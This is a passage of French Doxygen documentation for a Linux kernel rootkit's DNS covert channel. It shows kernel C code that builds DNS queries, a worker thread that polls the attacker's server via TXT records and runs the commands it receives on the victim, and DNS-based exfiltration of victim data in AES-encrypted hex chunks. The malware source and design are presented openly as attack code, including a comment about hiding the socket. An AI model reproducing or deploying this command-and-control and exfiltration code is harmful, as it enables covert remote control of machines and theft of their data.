</div><!-- fragment --><p>Par ailleurs, la fonction <code>dns_send_query</code> est l’élément central qui, dans <a class="el" href="../../d9/d54/dns_8c.html">dns.c</a>, construit à la main un paquet DNS (en UDP) et l’envoie au résolveur. Son prototype est <code><a class="el" href="../../d9/d54/dns_8c.html#af4fa4cede0d5ee503bc605138fea7da2" title="Send a single DNS question and receive the raw response.">dns_send_query()</a></code>. Après avoir alloué dynamiquement le buffer qui contiendra la requête dans son intégralité, on construit progressivement l’en-tête. </p><div class="fragment"><div class="line"><span class="keyword">struct </span><a class="code hl_struct" href="../../de/dd9/structdns__header__t.html">dns_header_t</a> *hdr = (<span class="keywordtype">void</span> *) packet_buffer;</div>
<div class="line">get_random_bytes(&amp;hdr-&gt;<a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#a555bb3191b65b5e9599f447653ed981d">id</a>, <span class="keyword">sizeof</span>(hdr-&gt;<a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#a555bb3191b65b5e9599f447653ed981d">id</a>));</div>
<div class="line">hdr-&gt;<a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#af4f7a53f6b2df72c34ca881f2714ac91">flags</a> = htons(0x0100);</div>
<div class="line">hdr-&gt;<a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#a8374f34065d456334e3c63c2ff3306cb">qdcount</a> = htons(1);</div>
<div class="line">hdr-&gt;<a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#acb0a9a6e729d7ba375297cf625fc938b">ancount</a> = htons(0);</div>
<div class="line">hdr-&gt;<a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#a5c1e988df4a22654a80ef9bbd5e83a13">nscount</a> = htons(0);</div>
<div class="line">hdr-&gt;<a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#af107879d493519cfa3dae4c4eb03e6c3">arcount</a> = htons(0);</div>
<div class="line">offset = <a class="code hl_define" href="../../db/d16/config_8h.html#ab45c21ad55157cd53ce4c58d5b7b449f">DNS_HDR_SIZE</a>;</div>
<div class="ttc" id="aconfig_8h_html_ab45c21ad55157cd53ce4c58d5b7b449f"><div class="ttname"><a href="../../db/d16/config_8h.html#ab45c21ad55157cd53ce4c58d5b7b449f">DNS_HDR_SIZE</a></div><div class="ttdeci">#define DNS_HDR_SIZE</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00044">config.h:44</a></div></div>
</div><!-- fragment --><h4><a class="anchor" id="autotoc_md59"></a>
3.2.2 QNAME</h4>
<p>Le champ <b>QNAME</b> représente le nom de domaine demandé. En DNS, il est encodé en <em>labels</em>. On parcourt donc après la construction du <em>header</em> la chaîne <code>query_name</code>. L'encodage est un peu particulier, car il faut précéder chaque partie entre les points par sa longueur en hexadécimal. Imaginons <code>query_name = 01/04-abcdef.command.com</code>, on aura : </p><div class="fragment"><div class="line">[0D] 30 31 2F 30 34 2D 61 62 63 64 65 66    <span class="comment">// &quot;01/04-abcdef&quot; (13 chars)</span></div>
<div class="line">[07] 63 6F 6D 6D 61 6E 64                   <span class="comment">// &quot;command&quot; (7 chars)</span></div>
<div class="line">[03] 63 6F 6D                               <span class="comment">// &quot;com&quot; (3 chars)</span></div>
<div class="line">[00]                                        <span class="comment">// Terminaison du QNAME</span></div>
</div><!-- fragment --><p>Concernant le <b>QTYPE</b>, deux possibilités existent selon l’appel de la fonction qui construit le paquet : soit 1 pour une requête de type <b>A</b> (adresse IPv4), soit 16 pour une requête de type <b>TXT</b> (texte). À ce stade, la section <em>Question</em> du paquet est complète : <em>header</em> (12 octets) + <b>QNAME</b> (labels + 0x00) + <b>QTYPE</b> (2 octets) + <b>QCLASS</b> (2 octets). <b>QCLASS</b> est le type de réseau ou de protocole pour lequel la requête DNS est faite (1 pour internet ici). On a donc bien finalement la requête DNS brute à envoyer.</p>
<h4><a class="anchor" id="autotoc_md60"></a>
3.2.3 Socket</h4>
<div class="fragment"><div class="line"><span class="comment">// Create a UDP socket in kernel (need to hide it ?)</span></div>
<div class="line">result = sock_create_kern(&amp;init_net, AF_INET, SOCK_DGRAM, IPPROTO_UDP, &amp;sock);</div>
<div class="line"><span class="keywordflow">if</span> (result &lt; 0) {</div>
<div class="line">  kfree(packet_buffer);</div>
<div class="line">  <span class="keywordflow">return</span> result;</div>
<div class="line">}</div>
<div class="line">  </div>
<div class="line"><span class="comment">// Prepare the destination address</span></div>
<div class="line">memset(&amp;dest_addr, 0, <span class="keyword">sizeof</span>(dest_addr));</div>
<div class="line">dest_addr.sin_family = AF_INET;</div>
<div class="line">dest_addr.sin_port = htons(<a class="code hl_define" href="../../db/d16/config_8h.html#ab1d3f5c08428c20521a92ca2fa20f46c">DNS_PORT</a>);</div>
<div class="line">in4_pton(<a class="code hl_variable" href="../../db/d16/config_8h.html#afbc356cd0e25d1dbbece7c10fd025fa6">ip</a>, -1, (u8 *)&amp;dest_addr.sin_addr.s_addr, -1, NULL);</div>
<div class="line"> </div>
<div class="line"><span class="comment">// Tell kernel_sendmsg where to send</span></div>
<div class="line">msg.msg_name = &amp;dest_addr;</div>
<div class="line">msg.msg_namelen = <span class="keyword">sizeof</span>(dest_addr);</div>
<div class="line"> </div>
<div class="line"><span class="comment">// Send the DNS query</span></div>
<div class="line">iov.iov_base = packet_buffer;</div>
<div class="line">iov.iov_len = offset;</div>
<div class="line">result = kernel_sendmsg(sock, &amp;msg, &amp;iov, 1, offset);</div>
<div class="line"><span class="keywordflow">if</span> (result &lt; 0) {</div>
<div class="line">  sock_release(sock);</div>
<div class="line">  kfree(packet_buffer);</div>
<div class="line">  <span class="keywordflow">return</span> result;</div>
<div class="line">}</div>
<div class="ttc" id="aconfig_8h_html_ab1d3f5c08428c20521a92ca2fa20f46c"><div class="ttname"><a href="../../db/d16/config_8h.html#ab1d3f5c08428c20521a92ca2fa20f46c">DNS_PORT</a></div><div class="ttdeci">#define DNS_PORT</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00042">config.h:42</a></div></div>
<div class="ttc" id="aconfig_8h_html_afbc356cd0e25d1dbbece7c10fd025fa6"><div class="ttname"><a href="../../db/d16/config_8h.html#afbc356cd0e25d1dbbece7c10fd025fa6">ip</a></div><div class="ttdeci">char * ip</div><div class="ttdef"><b>Definition</b> <a href="../../d0/d29/main_8c_source.html#l00006">main.c:6</a></div></div>
</div><!-- fragment --><p>La création de la socket et l'envoi du message sont ensuite assez classiques :</p><ul>
<li><code>sock_create_kern</code> crée une socket UDP depuis l’espace noyau.</li>
<li><code>dest_addr.sin_port = htons(DNS_PORT)</code> configure le port 53 (voir <a class="el" href="../../db/d16/config_8h.html">config.h</a>).</li>
<li><code>in4_pton(ip, ...)</code> convertit l’adresse IP du serveur DNS en <code>sin_addr.s_addr</code></li>
<li><code>kernel_sendmsg</code> envoie la requête DNS en une seule opération. <em>Bam !</em></li>
</ul>
<h4><a class="anchor" id="autotoc_md61"></a>
3.2.4 Réponse</h4>
<p>Toujours dans la même fonction de <a class="el" href="../../d9/d54/dns_8c.html">dns.c</a>, on reçoit une réponse de manière non bloquante, que l’on enregistre dans les buffers pointés par les paramètres de la fonction. L’interprétation de la réponse est effectuée dans une autre fonction que nous verrons par la suite. </p><div class="fragment"><div class="line">iov.iov_base = packet_buffer;</div>
<div class="line">iov.iov_len = <a class="code hl_define" href="../../db/d16/config_8h.html#aa1a62a1468067c7b022a024325225702">DNS_MAX_BUF</a>;</div>
<div class="line">result = kernel_recvmsg(sock, &amp;msg, &amp;iov, 1, <a class="code hl_define" href="../../db/d16/config_8h.html#aa1a62a1468067c7b022a024325225702">DNS_MAX_BUF</a>, MSG_DONTWAIT);</div>
<div class="line"><span class="keywordflow">if</span> (result &gt; 0) {</div>
<div class="line">  memcpy(response_buffer, packet_buffer, result);</div>
<div class="line">  *response_length = result;</div>
<div class="line">  result = 0;</div>
<div class="line">}</div>
<div class="line"><span class="keywordflow">else</span> <span class="keywordflow">if</span> (result == -EAGAIN || result == -EWOULDBLOCK) {</div>
<div class="line">  *response_length = 0;</div>
<div class="line">  result = 0;</div>
<div class="line">}</div>
<div class="ttc" id="aconfig_8h_html_aa1a62a1468067c7b022a024325225702"><div class="ttname"><a href="../../db/d16/config_8h.html#aa1a62a1468067c7b022a024325225702">DNS_MAX_BUF</a></div><div class="ttdeci">#define DNS_MAX_BUF</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00043">config.h:43</a></div></div>
</div><!-- fragment --><h3><a class="anchor" id="autotoc_md62"></a>
3.3 🎯 Commandes</h3>
<h4><a class="anchor" id="autotoc_md63"></a>
3.3.1 Worker</h4>
<p>Par ailleurs, le fichier <a class="el" href="../../d2/d22/dns_2worker_8c.html">dns/worker.c</a> contient un thread noyau dédié à la gestion continue des paquets DNS, en particulier à la réception des commandes. Ce thread exécute une boucle principale qui interroge régulièrement le serveur attaquant pour récupérer des instructions. Il est responsable des opérations suivantes :</p><ul>
<li>Interroger périodiquement l’attaquant via une requête TXT vers <code>command.DNS_DOMAIN</code>.</li>
<li>Si l’attaquant a mis une commande en attente, il la renvoie dans le champ TXT de la réponse.</li>
<li>Le rootkit sur la victime exécute cette commande.</li>
<li>Il renvoie ensuite la sortie de la commande (stdout/stderr/status) vers l’attaquant en utilisant <code>dns_send_data</code> dans <code><a class="el" href="../../d6/d6e/network_8c.html#a375e772b2efc7540285ea61d2c9e5694">send_to_server()</a></code> dans <a class="el" href="../../d6/d6e/network_8c.html">network.c</a>.</li>
</ul>
<div class="fragment"><div class="line"><span class="keyword">static</span> <span class="keywordtype">int</span> <a class="code hl_function" href="../../d2/d22/dns_2worker_8c.html#af15c7f87e4d52b4b1732abca083eb7e5">dns_worker</a>(<span class="keywordtype">void</span> *data) {</div>
<div class="line">  <span class="keywordtype">char</span> cmd_buf[<a class="code hl_define" href="../../db/d16/config_8h.html#accf0ac1ee8fd5b93a4a6b17582a022d5">RCV_CMD_BUFFER_SIZE</a> / 2];</div>
<div class="line"> </div>
<div class="line">  <span class="keywordflow">while</span> (!kthread_should_stop()) {</div>
<div class="line">    <span class="keywordtype">int</span> len = <a class="code hl_function" href="../../d9/d94/network_8h.html#a09e9c16fc7b47ed89818ee2a68368871">dns_receive_command</a>(cmd_buf, <span class="keyword">sizeof</span>(cmd_buf));</div>
<div class="line">      <span class="keywordflow">if</span> (len &gt; 0) {</div>
<div class="line">  </div>
<div class="line">        <span class="comment">// Send the command to the command handler</span></div>
<div class="line">        <a class="code hl_function" href="../../da/d32/cmd_8c.html#a7ed5a3859749957ee97404fa3484b22a">rootkit_command</a>(cmd_buf, len + 1, <a class="code hl_enumvalue" href="../../db/d16/config_8h.html#aac39b55be6469395f55ff0292ad8184cacb351e08d637347c1132ba8a73f0c812">DNS</a>);</div>
<div class="line">      }</div>
<div class="line"> </div>
<div class="line">      <span class="comment">// Sleep for a defined interval to avoid busy-waiting</span></div>
<div class="line">      msleep(<a class="code hl_define" href="../../db/d16/config_8h.html#acb370f80e5c43bcf22adc426fe44537d">DNS_POLL_INTERVAL_MS</a>);</div>
<div class="line">  }</div>
<div class="line"> </div>
<div class="line">  <span class="keywordflow">return</span> 0;</div>
<div class="line">}</div>
<div class="ttc" id="acmd_8c_html_a7ed5a3859749957ee97404fa3484b22a"><div class="ttname"><a href="../../da/d32/cmd_8c.html#a7ed5a3859749957ee97404fa3484b22a">rootkit_command</a></div><div class="ttdeci">int rootkit_command(char *command, unsigned command_size, enum Protocol protocol)</div><div class="ttdef"><b>Definition</b> <a href="../../da/d32/cmd_8c_source.html#l00122">cmd.c:122</a></div></div>
<div class="ttc" id="aconfig_8h_html_aac39b55be6469395f55ff0292ad8184cacb351e08d637347c1132ba8a73f0c812"><div class="ttname"><a href="../../db/d16/config_8h.html#aac39b55be6469395f55ff0292ad8184cacb351e08d637347c1132ba8a73f0c812">DNS</a></div><div class="ttdeci">@ DNS</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00030">config.h:30</a></div></div>
<div class="ttc" id="aconfig_8h_html_acb370f80e5c43bcf22adc426fe44537d"><div class="ttname"><a href="../../db/d16/config_8h.html#acb370f80e5c43bcf22adc426fe44537d">DNS_POLL_INTERVAL_MS</a></div><div class="ttdeci">#define DNS_POLL_INTERVAL_MS</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00041">config.h:41</a></div></div>
<div class="ttc" id="aconfig_8h_html_accf0ac1ee8fd5b93a4a6b17582a022d5"><div class="ttname"><a href="../../db/d16/config_8h.html#accf0ac1ee8fd5b93a4a6b17582a022d5">RCV_CMD_BUFFER_SIZE</a></div><div class="ttdeci">#define RCV_CMD_BUFFER_SIZE</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00037">config.h:37</a></div></div>
<div class="ttc" id="adns_2worker_8c_html_af15c7f87e4d52b4b1732abca083eb7e5"><div class="ttname"><a href="../../d2/d22/dns_2worker_8c.html#af15c7f87e4d52b4b1732abca083eb7e5">dns_worker</a></div><div class="ttdeci">static int dns_worker(void *data)</div><div class="ttdoc">Kernel thread function to process DNS-based commands.</div><div class="ttdef"><b>Definition</b> <a href="../../d2/d22/dns_2worker_8c_source.html#l00017">dns/worker.c:17</a></div></div>
<div class="ttc" id="anetwork_8h_html_a09e9c16fc7b47ed89818ee2a68368871"><div class="ttname"><a href="../../d9/d94/network_8h.html#a09e9c16fc7b47ed89818ee2a68368871">dns_receive_command</a></div><div class="ttdeci">int dns_receive_command(char *buffer, size_t max_len)</div><div class="ttdoc">Poll the attacker via DNS TXT-query for a pending command.</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00222">dns.c:222</a></div></div>
</div><!-- fragment --><h4><a class="anchor" id="autotoc_md64"></a>
3.3.2 Réception</h4>
<p>L’interprétation de la commande reçue via une requête <b>TXT</b> dans le <em>worker</em> est assurée par la fonction <code><a class="el" href="../../d9/d94/network_8h.html#a09e9c16fc7b47ed89818ee2a68368871" title="Poll the attacker via DNS TXT-query for a pending command.">dns_receive_command()</a></code>. Comme évoqué précédemment, cette fonction s’appuie sur <code>dns_send_query</code>, un <em>wrapper</em> générique chargé d’émettre la requête DNS. Une fois la requête envoyée, la victime lit la réponse brute dans le buffer <code>response_buffer_local</code>. Elle en extrait ensuite le contenu textuel situé dans la section <em>Answer TXT</em> du paquet DNS. La fonction <code>dns_receive_command</code> copie cette chaîne dans <code>cmd_buf</code> (via le paramètre <code>out_buffer</code>) et retourne la longueur du texte extrait. </p><div class="fragment"><div class="line"><span class="keywordtype">int</span> <a class="code hl_function" href="../../d9/d94/network_8h.html#a09e9c16fc7b47ed89818ee2a68368871">dns_receive_command</a>(<span class="keywordtype">char</span> *out_buffer, <span class="keywordtype">size_t</span> max_length) {</div>
<div class="line">  <span class="keywordtype">char</span> *poll_qname;</div>
<div class="line">  u8 *response_buffer_local;</div>
<div class="line">  <span class="keywordtype">int</span> response_length_local;</div>
<div class="line">  <span class="keywordtype">int</span> result;</div>
<div class="line">  <span class="keyword">struct </span><a class="code hl_struct" href="../../de/dd9/structdns__header__t.html">dns_header_t</a> *hdr;</div>
<div class="line">  u16 answer_count;</div>
<div class="line">  <span class="keywordtype">int</span> offset;</div>
<div class="line"> </div>
<div class="line">  <span class="comment">// Allocate local response buffer</span></div>
<div class="line">  response_buffer_local = kzalloc(<a class="code hl_define" href="../../db/d16/config_8h.html#aa1a62a1468067c7b022a024325225702">DNS_MAX_BUF</a>, GFP_KERNEL);</div>
<div class="line">  <span class="keywordflow">if</span> (!response_buffer_local)</div>
<div class="line">    <span class="keywordflow">return</span> -ENOMEM;</div>
<div class="line"> </div>
<div class="line">  <span class="comment">// Build the TXT-poll query name</span></div>
<div class="line">  poll_qname = kmalloc(128, GFP_KERNEL);</div>
<div class="line">  snprintf(poll_qname, 128, <span class="stringliteral">&quot;command.%s&quot;</span>, <a class="code hl_define" href="../../db/d16/config_8h.html#a62787143a36288db9af243c8bec2aa3b">DNS_DOMAIN</a>);</div>
<div class="line"> </div>
<div class="line">  <span class="comment">// Send TXT query and get raw response</span></div>
<div class="line">  result = <a class="code hl_function" href="../../d9/d54/dns_8c.html#af4fa4cede0d5ee503bc605138fea7da2">dns_send_query</a>(poll_qname, htons(16), response_buffer_local, &amp;response_length_local);</div>
<div class="line">  kfree(poll_qname);</div>
<div class="line">  <span class="keywordflow">if</span> (result &lt; 0) {</div>
<div class="line">    kfree(response_buffer_local);</div>
<div class="line">    <span class="keywordflow">return</span> -EIO;</div>
<div class="line">  }</div>
<div class="line"> </div>
<div class="line">  <span class="comment">// Parse DNS header and answer count</span></div>
<div class="line">  hdr = (<span class="keyword">struct </span><a class="code hl_struct" href="../../de/dd9/structdns__header__t.html">dns_header_t</a> *)response_buffer_local;</div>
<div class="line">  answer_count = ntohs(hdr-&gt;<a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#acb0a9a6e729d7ba375297cf625fc938b">ancount</a>);</div>
<div class="line">...</div>
<div class="ttc" id="aconfig_8h_html_a62787143a36288db9af243c8bec2aa3b"><div class="ttname"><a href="../../db/d16/config_8h.html#a62787143a36288db9af243c8bec2aa3b">DNS_DOMAIN</a></div><div class="ttdeci">#define DNS_DOMAIN</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00048">config.h:48</a></div></div>
<div class="ttc" id="adns_8c_html_af4fa4cede0d5ee503bc605138fea7da2"><div class="ttname"><a href="../../d9/d54/dns_8c.html#af4fa4cede0d5ee503bc605138fea7da2">dns_send_query</a></div><div class="ttdeci">static int dns_send_query(const char *query_name, __be16 question_type, u8 *response_buffer, int *response_length)</div><div class="ttdoc">Send a single DNS question and receive the raw response.</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00035">dns.c:35</a></div></div>
</div><!-- fragment --><h3><a class="anchor" id="autotoc_md65"></a>
3.4 🛰️ Exfiltration</h3>
<p>Pour transmettre des données, la machine victime utilise la fonction <code><a class="el" href="../../d9/d94/network_8h.html#a1f3fd0d4b58aa92d0cf7a54c4af03671" title="Exfiltrate a data buffer over DNS by hex-chunked A-queries.">dns_send_data()</a></code>. Cette fonction fragmente un flux de données binaires en <em>chunks</em>, les chiffre, les <em>hexify</em> (pour s’assurer d’avoir des caractères compatibles avec le protocole DNS), puis les envoie via une série de requêtes DNS. Du côté de l’attaquant, un serveur écoute ces requêtes et recompose les blocs afin de reconstituer l’information initiale. Chaque chunk est encodé dans un nom de domaine respectant les contraintes du protocole DNS. Concrètement, un chunk est transmis sous la forme <em>&lt;xx&gt;/&lt;xx&gt;-&lt;qname&gt;</em>, comme illustré précédemment. Le découpage est effectué au niveau des octets, avec une taille maximale définie par DNS_MAX_CHUNK (28 octets utiles). Cette limite permet de s’assurer que, même après encodage hexadécimal et ajout de préfixes, le QNAME généré reste conforme à la norme : moins de 253 octets au total et moins de 63 caractères entre chaque point (<a href="https://www.ietf.org/rfc/rfc1035.txt">RFC1035</a>)</p>
<h2><a class="anchor" id="autotoc_md66"></a>
4. 🔒 Chiffrement</h2>
<p>Pour garantir la confidentialité des échanges entre le client et le serveur, toutes les données sont chiffrées à l’aide de l’algorithme <b>AES-128</b> en mode <b>CBC</b> (Cipher Block Chaining). Ce choix assure à la fois une simplicité d’implémentation grâce à l'API de chiffrement du noyau Linux, et une sécurité suffisante pour les besoins de ce projet. Le chiffrement est appliqué à tous les messages échangés, qu’il s’agisse de commandes, de réponses ou de simples données.</p>
<h4><a class="anchor" id="autotoc_md67"></a>
Principes</h4>
<table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadNone">Élément   </th><th class="markdownTableHeadNone">Détail    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><b>Clé &amp; IV</b>   </td><td class="markdownTableBodyNone">Clé de chiffrement (<code>key</code>) et vecteur d’initialisation (<code>iv</code>) de <b>16 octets</b> (128 bits), conformément à la <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">spécification AES-128</a>.    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone"><b>Mode CBC</b>   </td><td class="markdownTableBodyNone">Le mode CBC introduit une dépendance entre blocs chiffrés, renforçant la sécurité contre certaines attaques.<br  />
Choisi pour sa simplicité d’implémentation et sa robustesse lors des tests.    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><b>Padding PKCS7</b>   </td><td class="markdownTableBodyNone">AES requiert que les données soient un multiple de 16 octets.<br  />
Le <a href="https://en.wikipedia.org/wiki/Padding_%28cryptography%29#PKCS7">padding PKCS7</a> complète automatiquement les données et est retiré après déchiffrement.   </td></tr>
</table>
<h4><a class="anchor" id="autotoc_md68"></a>
Implémentation</h4>
<p>Voici l'implementation Python du chiffrement AES-128-CBC avec padding PKCS7, présente dans le fichier <a class="el" href="../../da/d77/CryptoHandler_8py.html">CryptoHandler.py</a> :</p>
<div class="fragment"><div class="line"><span class="keyword">class </span><a class="code hl_namespace" href="../../dd/dbe/namespaceCryptoHandler.html">CryptoHandler</a>:</div>
<div class="line">    <span class="keyword">def </span>__init__(self, key: bytes, iv: bytes):</div>
<div class="line">        <span class="keywordflow">if</span> len(key) != 16 <span class="keywordflow">or</span> len(iv) != 16:</div>
<div class="line">            <span class="keywordflow">raise</span> ValueError(<span class="stringliteral">&quot;The key and IV must be exactly 16 bytes.&quot;</span>)</div>
<div class="line">        self.key = key</div>
<div class="line">        self.iv = iv</div>
<div class="line"> </div>
<div class="line">    <span class="keyword">def </span>encrypt(self, plaintext: str | bytes) -&gt; bytes:</div>
<div class="line">        <span class="keywordflow">if</span> isinstance(plaintext, str):</div>
<div class="line">            plaintext = plaintext.encode(<span class="stringliteral">&#39;utf-8&#39;</span>)</div>
<div class="line">        padder = padding.PKCS7(algorithms.AES.block_size).padder()</div>
<div class="line">        padded_data = padder.update(plaintext) + padder.finalize()</div>
<div class="line">        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=default_backend())</div>
<div class="line">        encryptor = cipher.encryptor()</div>
<div class="line">        <span class="keywordflow">return</span> encryptor.update(padded_data) + encryptor.finalize()</div>
<div class="line"> </div>
<div class="line">    <span class="keyword">def </span>decrypt(self, ciphertext: bytes) -&gt; str:</div>
<div class="line">        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=default_backend())</div>
<div class="line">        decryptor = cipher.decryptor()</div>
<div class="line">        padded_data = decryptor.update(ciphertext) + decryptor.finalize()</div>
<div class="line">        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()</div>
<div class="line">        data = unpadder.update(padded_data) + unpadder.finalize()</div>
<div class="line">        <span class="keywordflow">return</span> data.decode(<span class="stringliteral">&#39;utf-8&#39;</span>, errors=<span class="stringliteral">&#39;ignore&#39;</span>)</div>
<div class="ttc" id="anamespaceCryptoHandler_html"><div class="ttname"><a href="../../dd/dbe/namespaceCryptoHandler.html">CryptoHandler</a></div><div class="ttdef"><b>Definition</b> <a href="../../da/d77/CryptoHandler_8py_source.html#l00001">CryptoHandler.py:1</a></div></div>
</div><!-- fragment --><p><b>Points clés de l’implémentation</b></p>
<ul>
<li>Chiffrement : <br  />
<ol type="1">
<li>Conversion éventuelle de la chaîne en bytes.</li>
<li>Application du padding PKCS7.</li>
<li>Création d’un objet Cipher en mode CBC.</li>
<li>Chiffrement des données paddées.</li>
</ol>
</li>
<li>Déchiffrement : <br  />
<ol type="1">
<li>Déchiffrement du ciphertext.</li>
<li>Suppression du padding PKCS7.</li>
<li>Décodage en UTF-8.</li>
</ol>
</li>
</ul>
<h4><a class="anchor" id="autotoc_md69"></a>
Résumé</h4>
<ul>
<li><b>AES-128-CBC</b> avec <b>PKCS7</b> est utilisé pour tous les échanges.</li>
<li>La clé et l’IV sont de 16 octets.</li>
<li>Le padding est appliqué avant chiffrement et retiré après déchiffrement.</li>
<li>L’implémentation est identique côté Python et C pour garantir l’interopérabilité.</li>
</ul>
<p><img src="../../logo_no_text.png" alt="" style="
    display: block;
    margin: 100px auto;
    width: 30%;
    overflow: hidden;
  " class="inline"/> </p>
</div></div><!-- contents -->
</div><!-- PageDoc -->
</div><!-- doc-content -->

<div id="nav-path" class="navpath"><!-- id is needed for treeview function! --></div>
</body>
</html>
